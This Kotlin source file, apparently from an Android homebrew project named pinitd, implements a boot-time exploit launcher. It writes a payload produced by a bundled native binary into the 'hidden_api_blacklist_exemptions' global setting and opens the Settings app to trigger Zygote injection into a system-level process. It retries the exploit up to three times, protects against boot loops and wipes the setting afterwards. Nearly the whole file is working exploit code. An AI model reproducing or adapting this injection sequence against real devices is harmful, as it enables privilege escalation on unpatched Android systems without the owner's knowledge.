package com.penumbraos.pinitd.util

import android.content.Context
import android.content.Intent
import android.net.Uri
import android.provider.Settings
import android.util.Log
import com.penumbraos.pinitd.util.Logcat
import com.penumbraos.pinitd.SHARED_TAG
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import kotlin.time.Duration.Companion.milliseconds

val EXEMPTIONS_SETTING_URI: Uri = Settings.Global.getUriFor("hidden_api_blacklist_exemptions")

private const val MAX_EXPLOIT_ATTEMPTS = 3
private const val BOOT_STABILIZE_DELAY_MS = 10000L

fun launchWithBootProtection(context: Context) {
    Log.w(SHARED_TAG, "Boot completed. Delaying ${BOOT_STABILIZE_DELAY_MS}ms to wait for Android to stabilize")

    Thread.sleep(BOOT_STABILIZE_DELAY_MS)

    Log.w(SHARED_TAG, "Delay completed. Checking boot protection")

    val existingExemption = Settings.Global.getString(context.contentResolver, "hidden_api_blacklist_exemptions")
    if (!existingExemption.isNullOrEmpty()) {
        Log.e(SHARED_TAG, "hidden_api_blacklist_exemptions already set (len=${existingExemption.length}), clearing")
    }

    context.contentResolver.delete(EXEMPTIONS_SETTING_URI, null, null)

    val protection = BootLoopProtection(context)
    val launchStatus = protection.shouldAttemptLaunch()

    when (launchStatus) {
        BootProtectionStatus.ALREADY_BOOTED -> {}
        BootProtectionStatus.REQUIRES_BOOT -> {
            protection.recordAttempt()

            val scope = CoroutineScope(Dispatchers.IO)
            scope.launch {
                for (attempt in 1..MAX_EXPLOIT_ATTEMPTS) {
                    Log.w(SHARED_TAG, "Exploit attempt $attempt/$MAX_EXPLOIT_ATTEMPTS")

                    launchPinitd(scope, context, protection)

                    // The fcntl lock is dropped during daemonize (double-fork), so we can't
                    // use it to verify success. Wait for the expected system restart instead.
                    delay(15000)

                    Log.e(SHARED_TAG, "Still alive after attempt $attempt")

                    if (attempt < MAX_EXPLOIT_ATTEMPTS) {
                        delay(2000)
                    }
                }

                Log.e(SHARED_TAG, "pinitd failed to start after $MAX_EXPLOIT_ATTEMPTS attempts")
                protection.playDeathChime()
                forceClearVulnerability(context)
            }
        }
        BootProtectionStatus.DISABLED_BOOT -> {
            Log.w(SHARED_TAG, "Boot protection blocked launch")
            Log.i(SHARED_TAG, protection.getStatus())
            protection.playDeathChime()
        }
    }
}

suspend fun launchPinitd(scope: CoroutineScope, context: Context, protection: BootLoopProtection) {
    val basePath = context.packageCodePath.slice(0..context.packageCodePath.length-9)
    val binaryPath = basePath + "lib/arm64/libpinitd.so"
    try {
        val logcat = Logcat(scope)
        logcat.eatInBackground()

        val payloadResult = withContext(Dispatchers.IO) {
            val process = Runtime.getRuntime().exec(arrayOf(binaryPath, "build-payload"))
            val reader = BufferedReader(InputStreamReader(process.inputStream))
            val errReader = BufferedReader(InputStreamReader(process.errorStream))
            val payload = reader.readText()
            val stderrOutput = errReader.readText()
            reader.close()
            errReader.close()
            val exitCode = process.waitFor()
            Triple(payload, stderrOutput, exitCode)
        }
        var payload = payloadResult.first
        val stderrOutput = payloadResult.second

        if (stderrOutput.isNotEmpty()) {
            Log.w(SHARED_TAG, "build-payload stderr: $stderrOutput")
        }
        if (payload.isEmpty()) {
            Log.e(SHARED_TAG, "build-payload returned empty payload")
            return
        }

        val settingsIntent = context.packageManager.getLaunchIntentForPackage("com.android.settings")
        settingsIntent?.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)

        if (settingsIntent == null) {
            Log.e(SHARED_TAG, "Could not get Settings launch intent")
            return
        }

        Settings.Global.putString(context.contentResolver, "hidden_api_blacklist_exemptions", payload)

        startApp("Settings", context, settingsIntent)

        val foundLog = logcat.waitForSubstring("com.android.settings/1000 for top-activity", 2000.milliseconds)

        if (!foundLog) {
            Log.w(SHARED_TAG, "Settings launch log not received within timeout")
        }

        scope.launch {
            forceClearVulnerability(context)
        }
    } catch (e: Exception) {
        Log.e(SHARED_TAG, "Exploit error: ${e.message}")
        e.printStackTrace()
    }
}

fun startApp(name: String, context: Context, intent: Intent?) {
    try {
        if (intent != null) {
            context.startActivity(intent)
        } else {
            Log.e(SHARED_TAG, "Zygote trigger app not found")
        }
    } catch (e: Exception) {
        Log.e(SHARED_TAG, "Zygote trigger app launch error: ${e.message}")
    }
}

suspend fun forceClearVulnerability(context: Context) {
    (0..10).forEach { _ ->
        context.contentResolver.delete(EXEMPTIONS_SETTING_URI, null, null)
        delay(200)
    }
}
